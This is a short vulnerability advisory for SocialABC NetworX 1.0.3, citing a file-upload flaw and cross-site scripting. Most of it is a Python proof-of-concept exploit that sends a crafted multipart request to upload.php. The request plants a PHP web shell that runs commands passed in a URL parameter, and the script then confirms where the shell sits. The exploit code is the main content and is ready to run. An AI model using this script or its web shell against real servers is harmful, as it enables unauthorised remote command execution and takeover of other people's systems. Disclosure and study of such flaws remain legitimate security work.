source: https://www.securityfocus.com/bid/41396/info

SocialABC NetworX is prone to an arbitrary file-upload vulnerability and a cross-site scripting vulnerability because the application fails to sufficiently sanitize user-supplied input.

Attackers can exploit these issues to steal cookie-based authentication information, execute arbitrary client-side scripts in the context of the browser, upload and execute arbitrary files in the context of the webserver, and launch other attacks.

NetworX 1.0.3 is vulnerable; other versions may be affected.

import sys, socket
host = 'localhost'
path = '/networx'
port = 80

def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)

    s.send('POST ' + path + '/upload.php?logout=shell.php HTTP/1.1\r\n'
           'Host: ' + host + '\r\n'
           'Proxy-Connection: keep-alive\r\n'
           'User-Agent: x\r\n'
           'Content-Length: 193\r\n'
           'Cache-Control: max-age=0\r\n'
           'Origin: null\r\n'
           'Content-Type: multipart/form-data; boundary=----x\r\n'
           'Accept: text/html\r\n'
           'Accept-Encoding: gzip,deflate,sdch\r\n'
           'Accept-Language: en-US,en;q=0.8\r\n'
           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="Filedata"; filename="shell.php"\r\n'
           'Content-Type: application/octet-stream\r\n\r\n'
           '<?php echo "<pre>" + system($_GET["CMD"]) + "</pre>"; ?>\r\n'
           '------x--\r\n\r\n')

    resp = s.recv(8192)

    http_ok = 'HTTP/1.1 200 OK'

    if http_ok not in resp[:len(http_ok)]:
        print 'error uploading shell'
        return
    else: print 'shell uploaded'

    shell_path = path + '/tmp/shell.php'

    s.send('GET ' + shell_path + ' HTTP/1.1\r\n'\
           'Host: ' + host + '\r\n\r\n')

    if http_ok not in s.recv(8192)[:len(http_ok)]: print 'shell not found'
    else: print 'shell located at http://' + host + shell_path

upload_shell()